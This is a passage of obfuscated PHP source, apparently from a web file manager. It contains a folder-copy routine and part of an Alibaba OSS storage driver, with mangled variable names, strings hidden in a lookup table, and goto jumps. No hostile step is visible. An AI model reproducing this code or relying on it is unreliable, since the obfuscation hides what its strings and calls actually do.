Model($ãÉ‚×Æ“[681])->where($à€ÓşÆ)->delete(); } public function copyFolderFromIO($…¤‡éë, $ÌµšÉ®à, $’£µï®ß, $Â¤ø‰æç, $ûË•ŞµÂ, $¶ì¼ãÂ = false) { $°€ôùî© =& $_SERVER[Ò°Ì”İ•]; $…½º±Ú = array($°€ôùî©[645] => array(), $°€ôùî©[646] => array(), $°€ôùî©[644] => array(), $°€ôùî©[682] => array()); $£”»ø¯ú = $¶ì¼ãÂ ? $¶ì¼ãÂ : $…¤‡éë->pathThis($ÌµšÉ®à); $î®¶úİô = $this->fileNameExist($’£µï®ß, $£”»ø¯ú); $¤®«ş”” = $this->mkdir($’£µï®ß, $£”»ø¯ú, $Â¤ø‰æç); if (!$î®¶úİô || $Â¤ø‰æç == REPEAT_RENAME_FOLDER) { $Â¤ø‰æç = !1; } if ($î®¶úİô) { $this->_childrenAllMake($î®¶úİô); } Hook::trigger($°€ôùî©[683]); $this->_copyChildTo($…¤‡éë, $ÌµšÉ®à, $¤®«ş””, $Â¤ø‰æç, $…½º±Ú, $ûË•ŞµÂ); Hook::trigger($°€ôùî©[684]); if ($¤®«ş””) { $this->folderSizeResetChildren($¤®«ş””); } $this->_childrenListClear(); Model($°€ôùî©[647])->addAll($…½º±Ú[$°€ôùî©[645]], array(), !0); Model($°€ôùî©[648])->eventCopy($¤®«ş””); $this->saveAll($…½º±Ú[$°€ôùî©[646]]); Model($°€ôùî©[556])->linkAdd($…½º±Ú[$°€ôùî©[644]]); Model($°€ôùî©[556])->remove($…½º±Ú[$°€ôùî©[682]]); $this->folderSizeReset($’£µï®ß); $this->updateModifyTime($’£µï®ß); return $¤®«ş””; } private function _copyChildTo($ú»õ‘ê, $ã¨ƒõ¨, $° •é¡, $¬­…ÎüÎ, &$öÊ­÷í, $†¥Ç›×„) { $‹Ÿû =& $_SERVER[Ò°Ì”İ•]; $¢õÏ‘Š¿ = $this->sourceInfoCache($° •é¡); $é¢ÍÇÒï = $ú»õ‘ê->listPath($ã¨ƒõ¨); $é¢ÍÇÒï = $é¢ÍÇÒï ? $é¢ÍÇÒï : array($‹Ÿû[97] => array(), $‹Ÿû[96] => array()); $Ú¿ì­Ó = array_merge($é¢ÍÇÒï[$‹Ÿû[97]], $é¢ÍÇÒï[$‹Ÿû[96]]); $Á¬æ§µÌ = $this->_addFiles($ú»õ‘ê, $é¢ÍÇÒï[$‹Ÿû[97]], $†¥Ç›×„); $¤Ëè”— = array(); foreach ($Ú¿ì­Ó as &$²”¿ë»®) { if (isset($Á¬æ§µÌ[$²”¿ë»®[$‹Ÿû[32]]])) { $²”¿ë»® = $Á¬æ§µÌ[$²”¿ë»®[$‹Ÿû[32]]]; } $²”¿ë»®[$‹Ÿû[497]] = $²”¿ë»®[$‹Ÿû[33]] == $‹Ÿû[89]; $²”¿ë»®[$‹Ÿû[498]] = substr(_get($²”¿ë»®, $‹Ÿû[180], $‹Ÿû[12]), 0, 10); $²”¿ë»®[$‹Ÿû[90]] = _get($²”¿ë»®, $‹Ÿû[90], 0); $²”¿ë»®[$‹Ÿû[553]] = _get($²”¿ë»®, $‹Ÿû[553], 0); if (!isset($²”¿ë»®[$‹Ÿû[685]]) && $²”¿ë»®[$‹Ÿû[553]]) { $öÊ­÷í[$‹Ÿû[682]][] = $²”¿ë»®[$‹Ÿû[553]]; } if ($¬­…ÎüÎ) { $’ÖšÙû” = $this->fileNameExistCache($° •é¡, $²”¿ë»®[$‹Ÿû[32]]); if ($’ÖšÙû”) { if ($²”¿ë»®[$‹Ÿû[497]] || $¬­…ÎüÎ == REPEAT_SKIP) { continue; } if ($¬­…ÎüÎ == REPEAT_REPLACE) { $üî²ß = $this->sourceInfoCache($’ÖšÙû”); $ñ‘£ñæù = $this->fileHistory($üî²ß, $²”¿ë»®[$‹Ÿû[553]], $²”¿ë»®[$‹Ÿû[90]]); if ($ñ‘£ñæù) { $öÊ­÷í[$‹Ÿû[644]][] = $²”¿ë»®[$‹Ÿû[553]]; } continue; } else { if ($¬­…ÎüÎ == REPEAT_RENAME) { $²”¿ë»®[$‹Ÿû[32]] = $this->fileNameAutoCache($° •é¡, $²”¿ë»®[$‹Ÿû[32]], $¬­…ÎüÎ, !1); } } } } if (!$²”¿ë»®[$‹Ÿû[497]] && $²”¿ë»®[$‹Ÿû[553]] == 0) { continue; } if (!$²”¿ë»®[$‹Ÿû[497]] && $²”¿ë»®[$‹Ÿû[553]]) { $öÊ­÷í[$‹Ÿû[644]][] = $²”¿ë»®[$‹Ÿû[553]]; } $¤Ëè”—[] = $this->_makeItemData($²”¿ë»®, $¢õÏ‘Š¿, $²”¿ë»®[$‹Ÿû[32]]); } unset($²”¿ë»®); if (!empty($¤Ëè”—)) { $this->addAll($¤Ëè”—); $this->_childrenListSelect($° •é¡); } $ßÉ±Ò® = $this->_childrenList($° •é¡); $ßÉ±Ò® = array_to_keyvalue($ßÉ±Ò®, $‹Ÿû[32]); foreach ($Ú¿ì­Ó as $²”¿ë»®) { $üî²ß = $ßÉ±Ò®[$²”¿ë»®[$‹Ÿû[32]]]; $¡¢ƒ¶€› = $üî²ß[$‹Ÿû[204]]; $this->_copyApplyMeta($üî²ß, $öÊ­÷í); if ($²”¿ë»®[$‹Ÿû[33]] == $‹Ÿû[89]) { $²”¿ë»®[$‹Ÿû[98]] = $ú»õ‘ê->getPathInner($²”¿ë»®[$‹Ÿû[98]]); $this->_copyChildTo($ú»õ‘ê, $²”¿ë»®[$‹Ÿû[98]], $¡¢ƒ¶€›, $¬­…ÎüÎ, $öÊ­÷í, $†¥Ç›×„); } } } private function _addFiles($‘«ãƒÖÉ, $Íô¹¸• , $Ê¢ã¡ìï) { $½Ù®É…÷ =& $_SERVER[Ò°Ì”İ•]; if (!$Íô¹¸•  || count($Íô¹¸• ) == 0) { return array(); } $µ£‡üÃ´ = array(); foreach ($Íô¹¸•  as &$˜ª˜â†) { Hook::trigger($½Ù®É…÷[686], $˜ª˜â†); $˜ª˜â†[$½Ù®É…÷[98]] = $‘«ãƒÖÉ->getPathInner($˜ª˜â†[$½Ù®É…÷[98]]); $ëÄÊ§·† = $‘«ãƒÖÉ->hashSimple($˜ª˜â†[$½Ù®É…÷[98]]); $üµ™íšè = $‘«ãƒÖÉ->hashMd5($˜ª˜â†[$½Ù®É…÷[98]]); if (strlen($üµ™íšè) > 10 && !isset($µ£‡üÃ´[$üµ™íšè])) { $µ£‡üÃ´[$üµ™íšè] = array(); } $˜ª˜â†[$½Ù®É…÷[687]] = $ëÄÊ§·†; $˜ª˜â†[$½Ù®É…÷[559]] = $üµ™íšè; $µ£‡üÃ´[$üµ™íšè][] =& $˜ª˜â†; if (count($µ£‡üÃ´[$üµ™íšè]) > 1) { $˜ª˜â†[$½Ù®É…÷[685]] = !0; } Hook::trigger($½Ù®É…÷[688], $˜ª˜â†); } unset($˜ª˜â†); $½”Úùü§ = array($½Ù®É…÷[559] => array($½Ù®É…÷[7], array_keys($µ£‡üÃ´))); $‘Õ˜¸â = Model($½Ù®É…÷[689]); $ïéÙ ¶ù = $‘Õ˜¸â->where($½”Úùü§)->select(); $ïéÙ ¶ù = $ïéÙ ¶ù ? $ïéÙ ¶ù : array(); foreach ($ïéÙ ¶ù as $ø±µ¿ß¹) { if (!isset($µ£‡üÃ´[$ø±µ¿ß¹[$½Ù®É…÷[559]]])) { continue; } $ÀàÜê¹Ñ = $µ£‡üÃ´[$ø±µ¿ß¹[$½Ù®É…÷[559]]]; foreach ($ÀàÜê¹Ñ as &$˜ª˜â†) { $˜ª˜â†[$½Ù®É…÷[553]] = $ø±µ¿ß¹[$½Ù®É…÷[553]]; $˜ª˜â†[$½Ù®É…÷[685]] = !0; } unset($˜ª˜â†); } $™¯™š€º = array(); foreach ($Íô¹¸•  as $ôíë•Ù§) { Hook::trigger($½Ù®É…÷[690], $ôíë•Ù§); if (isset($ôíë•Ù§[$½Ù®É…÷[685]]) && $ôíë•Ù§[$½Ù®É…÷[685]]) { Hook::trigger($½Ù®É…÷[691], $ôíë•Ù§); continue; } $îîß‹•ñ = $‘«ãƒÖÉ->getPathInner($ôíë•Ù§[$½Ù®É…÷[98]]); $Ã›û­ÑÖ = $‘Õ˜¸â->addFileMake($îîß‹•ñ, $ôíë•Ù§[$½Ù®É…÷[90]], $ôíë•Ù§[$½Ù®É…÷[687]], $ôíë•Ù§[$½Ù®É…÷[559]], $ôíë•Ù§[$½Ù®É…÷[32]], $Ê¢ã¡ìï); Hook::trigger($½Ù®É…÷[691], $ôíë•Ù§); if (!is_array($Ã›û­ÑÖ)) { continue; } $™¯™š€º[] = $Ã›û­ÑÖ; } $‘Õ˜¸â->addAll($™¯™š€º); $½”Úùü§ = array($½Ù®É…÷[559] => array($½Ù®É…÷[7], array_keys($µ£‡üÃ´))); $ïéÙ ¶ù = $‘Õ˜¸â->where($½”Úùü§)->select(); $ïéÙ ¶ù = $ïéÙ ¶ù ? $ïéÙ ¶ù : array(); foreach ($ïéÙ ¶ù as $ø±µ¿ß¹) { if (!isset($µ£‡üÃ´[$ø±µ¿ß¹[$½Ù®É…÷[559]]])) { continue; } $µÙñØÈç =& $µ£‡üÃ´[$ø±µ¿ß¹[$½Ù®É…÷[559]]]; foreach ($µÙñØÈç as &$˜ª˜â†) { $˜ª˜â†[$½Ù®É…÷[553]] = $ø±µ¿ß¹[$½Ù®É…÷[553]]; } unset($˜ª˜â†); } $ã¸Ö§ÍÏ = array(); foreach ($Íô¹¸•  as $‹€ªø´µ) { $ã¸Ö§ÍÏ[$‹€ªø´µ[$½Ù®É…÷[32]]] = $‹€ªø´µ; } return $ã¸Ö§ÍÏ; } } define($_SERVER[Ò°Ì”İ•][692], $_SERVER[Ò°Ì”İ•][693]); goto fŠßÔŒ¢Ş±; EÛ…Ãêˆ÷°: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($åçËà–ø) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ò°Ì”İ•][1459]; $this->_init($åçËà–ø); } public function _init($êŒìÌÙ) { $×ÅªƒŠº =& $_SERVER[Ò°Ì”İ•]; $this->config = $êŒìÌÙ; foreach ($êŒìÌÙ as $÷–ÖŒ½Ï => $áéÊù¿à) { if (isset($this->{$÷–ÖŒ½Ï})) { $this->{$÷–ÖŒ½Ï} = $áéÊù¿à; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($×ÅªƒŠº[1460] . LNG($×ÅªƒŠº[1461])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ĞÉÇßö¥ =& $_SERVER[Ò°Ì”İ•]; $äâÇæ® = new OSS\Model\CorsConfig(); $Ù°À£Í = new OSS\Model\CorsRule(); $Ù°À£Í->addAllowedOrigin($ĞÉÇßö¥[1462]); $Ù°À£Í->addAllowedMethod($ĞÉÇßö¥[1463]); $Ù°À£Í->addAllowedMethod($ĞÉÇßö¥[1464]); $Ù°À£Í->addAllowedMethod($ĞÉÇßö¥[1465]); $Ù°À£Í->addAllowedMethod($ĞÉÇßö¥[1466]); $Ù°À£Í->addAllowedMethod($ĞÉÇßö¥[176]); $Ù°À£Í->setMaxAgeSeconds(600); $Ù°À£Í->addExposeHeader($ĞÉÇßö¥[1467]); $Ù°À£Í->addAllowedHeader($ĞÉÇßö¥[1462]); $äâÇæ®->addRule($Ù°À£Í); try { $this->client->putBucketCors($this->bucket, $äâÇæ®); } catch (OSS\Core\OssException $ÜÃƒÁñ™) { $this->writeLog(__FUNCTION__ . $ĞÉÇßö¥[225] . $ÜÃƒÁñ™->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÙÜ³Û±» =& $_SERVER[Ò°Ì”İ•]; $ñÕµ“õë = null; try { $ñÕµ“õë = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ğ¬êöçş) { $this->writeLog(__FUNCTION__ . $ÙÜ³Û±»[225] . $ğ¬êöçş->getMessage()); return null; } if (!$ñÕµ“õë || !($¶†²Ş» = $ñÕµ“õë->getRules())) { return null; } $ñÅ‘†íç = $¶†²Ş»[0]->getAllowedOrigins(); $ßåÕ ¨ç = $¶†²Ş»[0]->getAllowedMethods(); $•‚İÜÅ = $¶†²Ş»[0]->getMaxAgeSeconds(); $Àá¼ìˆ = $¶†²Ş»[0]->getExposeHeaders(); $ûö¬ˆı³ = $¶†²Ş»[0]->getAllowedHeaders(); return array($ÙÜ³Û±»[231] => isset($ñÅ‘†íç[0]) ? $ñÅ‘†íç[0] : $ÙÜ³Û±»[12], $ÙÜ³Û±»[235] => $ßåÕ ¨ç, $ÙÜ³Û±»[1468] => $•‚İÜÅ, $ÙÜ³Û±»[1469] => isset($Àá¼ìˆ[0]) ? $Àá¼ìˆ[0] : $ÙÜ³Û±»[12], $ÙÜ³Û±»[232] => isset($ûö¬ˆı³[0]) ? $ûö¬ˆı³[0] : $ÙÜ³Û±»[12]); } public function isBucketCors() { $İáÜ–Ë‰ =& $_SERVER[Ò°Ì”İ•]; $¯ºÃëÀŞ = $this->getBucketCors(); if (!$¯ºÃëÀŞ || !is_array($¯ºÃëÀŞ)) { return !1; } if ($¯ºÃëÀŞ[$İáÜ–Ë‰[231]] != $İáÜ–Ë‰[233] || $¯ºÃëÀŞ[$İáÜ–Ë‰[232]] != $İáÜ–Ë‰[233]) { return !1; } $‚îË„¤ = array_map($İáÜ–Ë‰[234], $¯ºÃëÀŞ[$İáÜ–Ë‰[235]]); if (!is_array($‚îË„¤)) { $‚îË„¤ = array(); } $‹±ö¹Á = array($İáÜ–Ë‰[236], $İáÜ–Ë‰[237], $İáÜ–Ë‰[238], $İáÜ–Ë‰[239], $İáÜ–Ë‰[240]); $ÍÙ¬à«á = array_diff($‹±ö¹Á, $‚îË„¤); return empty($ÍÙ¬à«á); } public function mkfile($Í·Ğøû´, $Õ†²ãÚ° = '', $©”í†Ş = REPEAT_RENAME) { $Ö‹ŸâÒ­ = $this->setContent($Í·Ğøû´, $Õ†²ãÚ°); if ($Ö‹ŸâÒ­ !== !1) { return $this->getPathOuter($Í·Ğøû´); } return !1; } public function mkdir($ÅÔ›¤×À, $Æşª¶Ñ® = REPEAT_SKIP) { if ($Æşª¶Ñ® && $this->_isFolder($ÅÔ›¤×À)) { return $this->getPathOuter($ÅÔ›¤×À); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÅÔ›¤×À)); } catch (OSS\Core\OssException $ĞôÌéœ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][225] . $ĞôÌéœ->getMessage()); return !1; } return $this->getPathOuter($ÅÔ›¤×À); } private function fileList($ÅşÏÙİ¾, $ ¨ÁÃ“ş = '', $’ £æèŠ = 0) { $†®×­ñı =& $_SERVER[Ò°Ì”İ•]; $ÅşÏÙİ¾ = trim($ÅşÏÙİ¾, $†®×­ñı[8]); $îúÙ„  = empty($ÅşÏÙİ¾) && $ÅşÏÙİ¾ !== $†®×­ñı[241] ? $†®×­ñı[12] : $ÅşÏÙİ¾ . $†®×­ñı[8]; $Ø¼à¿Ìß = $†®×­ñı[12]; $ÖƒÂ÷…İ = 1000; $–Ö½ËÌ£ = $Š•±³¹³ = array(); while (!0) { check_abort(); $À•§×Á® = array($†®×­ñı[1470] => $ ¨ÁÃ“ş, $†®×­ñı[1471] => $îúÙ„ , $†®×­ñı[1472] => $ÖƒÂ÷…İ, $†®×­ñı[1473] => $Ø¼à¿Ìß); try { $¤™€Ë ë = $this->client->listObjects($this->bucket, $À•§×Á®); } catch (OSS\Core\OssException $Ø‡åÕì¸) { $this->writeLog(__FUNCTION__ . $†®×­ñı[225] . $Ø‡åÕì¸->getMessage()); break; } $Ø¼à¿Ìß = $¤™€Ë ë->getNextMarker(); $Ê‹ÊÀ„ï = $¤™€Ë ë->getObjectList(); $°âé€á = $¤™€Ë ë->getPrefixList(); foreach ($Ê‹ÊÀ„ï as $ŞÄöÒÃØ) { if ($ŞÄöÒÃØ->getKey() == $îúÙ„ ) { continue; } $§›øìß = $ŞÄöÒÃØ->getKey(); $¢Ğ¸Ó°’ = $ŞÄöÒÃØ->getSize(); $íó–ñ¨ø = $ŞÄöÒÃØ->getLastModified(); $ö²¼Êö‹ = trim($ŞÄöÒÃØ->getETag(), $†®×­ñı[132]); $”ÖÔÑû¤ = $’ £æèŠ ? array($†®×­ñı[32] => $§›øìß, $†®×­ñı[90] => $¢Ğ¸Ó°’, $†®×­ñı[217] => strtotime($íó–ñ¨ø), $†®×­ñı[1474] => $ö²¼Êö‹) : $§›øìß; $º¦†®î½ = $¢Ğ¸Ó°’ == 0 && substr($§›øìß, strlen($§›øìß) - 1, 1) == $†®×­ñı[8] ? !0 : !1; $¨ğŞ°Ş˜ = array($†®×­ñı[90] => $¢Ğ¸Ó°’, $†®×­ñı[1475] => $¢Ğ¸Ó°’, $†®×­ñı[99] => strtotime($íó–ñ¨ø), $†®×­ñı[1476] => $íó–ñ¨ø, $†®×­ñı[1474] => $ö²¼Êö‹); $this->cacheMethodInfoSet($§›øìß, $º¦†®î½, $¨ğŞ°Ş˜); if ($º¦†®î½) { $–Ö½ËÌ£[] = $§›øìß; continue; } $Š•±³¹³[] = $”ÖÔÑû¤; } foreach ($°âé€á as $Åú‰÷Ş™) { $–Ö½ËÌ£[] = $Åú‰÷Ş™->getPrefix(); $this->cacheMethodInfoSet($Åú‰÷Ş™->getPrefix(), !0); } if ($Ø¼à¿Ìß === $†®×­ñı[12]) { break; } } $this->cacheMethodInfoSet($ÅşÏÙİ¾, !0); return array($†®×­ñı[96] => $–Ö½ËÌ£, $†®×­ñı[97] => $Š•±³¹³); } public function listObject($ÇÎª¨œÌ, $…ÉÌ„Ö = '') { $º‡ß€®Ø =& $_SERVER[Ò°Ì”İ•]; $ÇÎª¨œÌ = trim($ÇÎª¨œÌ, $º‡ß€®Ø[8]); $ıÕÁÛˆ¤ = empty($ÇÎª¨œÌ) && $ÇÎª¨œÌ !== $º‡ß€®Ø[241] ? $º‡ß€®Ø[12] : $ÇÎª¨œÌ . $º‡ß€®Ø[8]; $ğèÀûúŸ = $º‡ß€®Ø[12]; $­Şõ÷Á = 1000; $‹Û³İ˜‚ = $ë‡š¦©¥ = array(); while (!0) { check_abort(); $âÈˆŠãÖ = array($º‡ß€®Ø[1470] => $…ÉÌ„Ö, $º‡ß€®Ø[1471] => $ıÕÁÛˆ¤, $º‡ß€®Ø[1472] => $­Şõ÷Á, $º‡ß€®Ø[1473] => $ğèÀûúŸ); try { $Ñòñ—ê° = $this->client->listObjects($this->bucket, $âÈˆŠãÖ); } catch (OSS\Core\OssException $´‰³Ïõ) { $this->writeLog(__FUNCTION__ . $º‡ß€®Ø[225] . $´‰³Ïõ->getMessage()); break; } $ğèÀûúŸ = $Ñòñ—ê°->getNextMarker(); $À ÏÆØá = $Ñòñ—ê°->getObjectList(); foreach ($À ÏÆØá as $»Ğ÷±é½) { if ($»Ğ÷±é½->getKey() == $ıÕÁÛˆ¤) { continue; } $‹¦ãÙĞ³ = $»Ğ÷±é½->getKey(); $¦‹¼ÕèÃ = $»Ğ÷±é½->getSize(); $Ğ©ß¶ºˆ = $¦‹¼ÕèÃ == 0 && substr($‹¦ãÙĞ³, strlen($‹¦ãÙĞ³) - 1, 1) == $º‡ß€®Ø[8] ? !0 : !1; if ($Ğ©ß¶ºˆ) { continue; } $ë‡š¦©¥[] = $¦‹¼ÕèÃ . $º‡ß€®Ø[225] . $‹¦ãÙĞ³; } if ($ğèÀûúŸ === $º‡ß€®Ø[12]) { break; } } return array($º‡ß€®Ø[96] => $‹Û³İ˜‚, $º‡ß€®Ø[97] => $ë‡š¦©¥); } public function copyFile($âö€‚Œ£, $ÄâÂ’¢) { $êƒàÏ = $this->size($âö€‚Œ£); if ($êƒàÏ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $âö€‚Œ£, $this->bucket, $this->pathEncode($ÄâÂ’¢)); } catch (OSS\Core\OssException $‰Û±á¼´) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][225] . $‰Û±á¼´->getMessage()); return !1; } return $this->getPathOuter($ÄâÂ’¢); } $¨Á¯¼òÛ = $this->multiCopyObject($âö€‚Œ£, $ÄâÂ’¢, $êƒàÏ); return $¨Á¯¼òÛ ? $this->getPathOuter($ÄâÂ’¢) : !1; } private function multiCopyObject($äÛ­†œ, $“ÕÌà¬ù, $Š–Çõæˆ) { $øúçÃÛ =& $_SERVER[Ò°Ì”İ•]; try { $«’Û¥±ê = array(); if ($İŸÇ‡Ó± = $this->hashMd5($äÛ­†œ)) { $«’Û¥±ê = array(OSS\OssClient::OSS_HEADERS => array($øúçÃÛ[1477] => $İŸÇ‡Ó±)); } $û„–¸šü = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($“ÕÌà¬ù), $«’Û¥±ê); $°£³”Šò = 1; $ñ¬‚Ü¡ = 0; $ò–æê˜µ = array(); $€šÀ”Àú = 1024 * 1024 * 10; $¸Ç¢¸Ë” = $this->client->generateMultiuploadParts($Š–Çõæˆ, $€šÀ”Àú); foreach ($¸Ç¢¸Ë” as $á°İÃñ± => $ŸÒÒ¬‘Ş) { $º¯Œ‡¤ = $ñ¬‚Ü¡ + (int) $ŸÒÒ¬‘Ş[$øúçÃÛ[1478]]; $ı§ş”–¾ = (int) $ŸÒÒ¬‘Ş[$øúçÃÛ[424]] + $º¯Œ‡¤ - 1; $«­ğ½Ò = array($øúçÃÛ[178] => $º¯Œ‡¤, $øúçÃÛ[179] => $ı§ş”–¾); $ò–æê˜µ[] = $this->client->uploadPartCopy($this->bucket, $äÛ­†œ, $this->bucket, $this->pathEncode($“ÕÌà¬ù), $°£³”Šò, $û„–¸šü, $«­ğ½Ò); $°£³”Šò = $°£³”Šò + 1; } $‹ÔÕ÷ÓÔ = array(); foreach ($ò–æê˜µ as $á°İÃñ± => $ãš‘ß£‡) { $‹ÔÕ÷ÓÔ[] = array($øúçÃÛ[309] => $á°İÃñ± + 1, $øúçÃÛ[310] => $ãš‘ß£‡); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($“ÕÌà¬ù), $û„–¸šü, $‹ÔÕ÷ÓÔ); } catch (OSS\Core\OssException $§ë½€ŠÆ) { $this->writeLog(__FUNCTION__ . $øúçÃÛ[225] . $§ë½€ŠÆ->getMessage()); return !1; } return !0; } public function moveFile($ıá†³¸, $¬–È¢Ã) { if ($this->copyFile($ıá†³¸, $¬–È¢Ã)) { $this->remove($ıá†³¸); return $this->getPathOuter($¬–È¢Ã); } return !1; } public function delFile($¬â•‘úê) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¬â•‘úê)); } catch (OSS\Core\OssException $©ë³’¿¨) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][225] . $©ë³’¿¨->getMessage()); return !1; } return !0; } public function delFolder($†±¹ÍšÊ) { $Èõ•ò…É =& $_SERVER[Ò°Ì”İ•]; if (!$this->exist($†±¹ÍšÊ)) { return !0; } $this->listItemCache = !1; $·ê¥¸âñ = $this->fileList($†±¹ÍšÊ); $this->listItemCache = !0; $º«¨ÅÏü = trim($†±¹ÍšÊ, $Èõ•ò…É[8]) . $Èõ•ò…É[8]; if (!empty($†±¹ÍšÊ) && $†±¹ÍšÊ !== $Èõ•ò…É[241] && !in_array($º«¨ÅÏü, $·ê¥¸âñ[$Èõ•ò…É[96]])) { $·ê¥¸âñ[$Èõ•ò…É[96]][] = $º«¨ÅÏü; } $¤²¡âÚÕ = $this->delByBatch($·ê¥¸âñ[$Èõ•ò…É[97]]); if (!$¤²¡âÚÕ) { return !1; } $¤²¡âÚÕ = $this->delByBatch($·ê¥¸âñ[$Èõ•ò…É[96]]); if (!$¤²¡âÚÕ) { return !1; } return $this->delFile($º«¨ÅÏü); } private function delByBatch($¶²£—Ö÷) { foreach (array_chunk($¶²£—Ö÷, 1000) as $Ú½‰öîÏ) { try { $this->client->deleteObjects($this->bucket, $Ú½‰öîÏ); } catch (OSS\Core\OssException $õ¦–Œ‚Ÿ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][225] . $õ¦–Œ‚Ÿ->getMessage()); return !1; } } return !0; } public function rename($…ƒÆ€†›, $èÉ•ï ) { return $this->renameObject($…ƒÆ€†›, $èÉ•ï ); } private function fileInfo($È¯ı…½Ë, $³œÜô‘ = false, $âÈÌöÃ“ = array()) { $úÔéé¾ =& $_SERVER[Ò°Ì”İ•]; $ÖßÊ‚Ò = array($úÔéé¾[32] => $this->pathThis($È¯ı…½Ë), $úÔéé¾[98] => $this->getPathOuter($È¯ı…½Ë), $úÔéé¾[33] => $úÔéé¾[243], $úÔéé¾[90] => isset($âÈÌöÃ“[$úÔéé¾[90]]) ? $âÈÌöÃ“[$úÔéé¾[90]] : 0, $úÔéé¾[180] => $this->ext($È¯ı…½Ë)); if ($³œÜô‘) { return $ÖßÊ‚Ò; } $ÖßÊ‚Ò[$úÔéé¾[244]] = $ÖßÊ‚Ò[$úÔéé¾[99]] = 0; $ÖßÊ‚Ò[$úÔéé¾[245]] = $ÖßÊ‚Ò[$úÔéé¾[246]] = !0; if (empty($âÈÌöÃ“)) { $ş¨²úûŞ = $this->objectMeta($È¯ı…½Ë); if (!$ş¨²úûŞ) { return $ÖßÊ‚Ò; } $âÈÌöÃ“ = array($úÔéé¾[99] => strtotime($ş¨²úûŞ[$úÔéé¾[1476]]), $úÔéé¾[90] => $ş¨²úûŞ[$úÔéé¾[1475]] + 0, $úÔéé¾[1474] => $ş¨²úûŞ[$úÔéé¾[1474]]); } if (isset($âÈÌöÃ“[$úÔéé¾[1474]]) && $âÈÌöÃ“[$úÔéé¾[1474]]) { $ÖßÊ‚Ò[$úÔéé¾[248]] = trim($âÈÌöÃ“[$úÔéé¾[1474]], $úÔéé¾[132]); } if (isset($âÈÌöÃ“[$úÔéé¾[90]])) { $ÖßÊ‚Ò[$úÔéé¾[90]] = $âÈÌöÃ“[$úÔéé¾[90]]; } if (isset($âÈÌöÃ“[$úÔéé¾[99]])) { $ÖßÊ‚Ò[$úÔéé¾[99]] = $âÈÌöÃ“[$úÔéé¾[99]]; } if (isset($âÈÌöÃ“[$úÔéé¾[217]]) && !trim($ÖßÊ‚Ò[$úÔéé¾[99]])) { $ÖßÊ‚Ò[$úÔéé¾[99]] = $âÈÌöÃ“[$úÔéé¾[217]]; } return $ÖßÊ‚Ò; } private function folderInfo($é•ûò¦ú, $äó¨±Ã¯ = false, $²™£Œ‡ù = array()) { $ï¢´ó¦ =& $_SERVER[Ò°Ì”İ•]; $¯•İ‘ = array($ï¢´ó¦[32] => $this->pathThis($é•ûò¦ú), $ï¢´ó¦[98] => $this->getPathOuter($ï¢´ó¦[8] . $é•ûò¦ú), $ï¢´ó¦[33] => $ï¢´ó¦[89]); if ($äó¨±Ã¯) { return $¯•İ‘; } $¯•İ‘[$ï¢´ó¦[244]] = $¯•İ‘[$ï¢´ó¦[99]] = 0; $¯•İ‘[$ï¢´ó¦[245]] = $¯•İ‘[$ï¢´ó¦[246]] = !0; if (empty($²™£Œ‡ù)) { $é•ûò¦ú = rtrim($é•ûò¦ú, $ï¢´ó¦[8]) . $ï¢´ó¦[8]; $ĞÏòÓ÷ = $this->objectMeta($é•ûò¦ú); if (!$ĞÏòÓ÷) { return $¯•İ‘; } $²™£Œ‡ù = array($ï¢´ó¦[244] => $ĞÏòÓ÷[$ï¢´ó¦[587]][$ï¢´ó¦[1479]], $ï¢´ó¦[99] => strtotime($ĞÏòÓ÷[$ï¢´ó¦[1476]])); } if (isset($²™£Œ‡ù[$ï¢´ó¦[99]])) { $¯•İ‘[$ï¢´ó¦[99]] = $²™£Œ‡ù[$ï¢´ó¦[99]]; } if (isset($²™£Œ‡ù[$ï¢´ó¦[244]])) { $¯•İ‘[$ï¢´ó¦[244]] = $²™£Œ‡ù[$ï¢´ó¦[244]]; } return $¯•İ‘; } public function listPath($ë´³ìñ, $Ô„É‰› = false) { $ñ±„ç£‚ =& $_SERVER[Ò°Ì”İ•]; $Ü«÷ŸÅ¼ = $this->fileList($ë´³ìñ, $ñ±„ç£‚[8], !0); foreach ($Ü«÷ŸÅ¼[$ñ±„ç£‚[96]] as $ğØ­Í©¥ => $ş¾¡¢¬) { $Ü«÷ŸÅ¼[$ñ±„ç£‚[96]][$ğØ­Í©¥] = $this->folderInfo($ş¾¡¢¬, $Ô„É‰›, $ş¾¡¢¬); } foreach ($Ü«÷ŸÅ¼[$ñ±„ç£‚[97]] as $ğØ­Í©¥ => $ş¾¡¢¬) { $Ü«÷ŸÅ¼[$ñ±„ç£‚[97]][$ğØ­Í©¥] = $this->fileInfo($ş¾¡¢¬[$ñ±„ç£‚[32]], $Ô„É‰›, $ş¾¡¢¬); } return $Ü«÷ŸÅ¼; } protected function infoChildren($ˆğşÇ‡, &$¥¾†¥Áì) { $…ê ûíÏ =& $_SERVER[Ò°Ì”İ•]; $×ğÒØŒã = $this->fileList($ˆğşÇ‡, $…ê ûíÏ[12], !0); $¥¾†¥Áì[$…ê ûíÏ[92]] += count($×ğÒØŒã[$…ê ûíÏ[96]]); $¥¾†¥Áì[$…ê ûíÏ[91]] += count($×ğÒØŒã[$…ê ûíÏ[97]]); foreach ($×ğÒØŒã[$…ê ûíÏ[97]] as $Ú¨Äø„Ò) { if (!$Ú¨Äø„Ò || !$Ú¨Äø„Ò[$…ê ûíÏ[90]]) { continue; } $¥¾†¥Áì[$…ê ûíÏ[90]] += 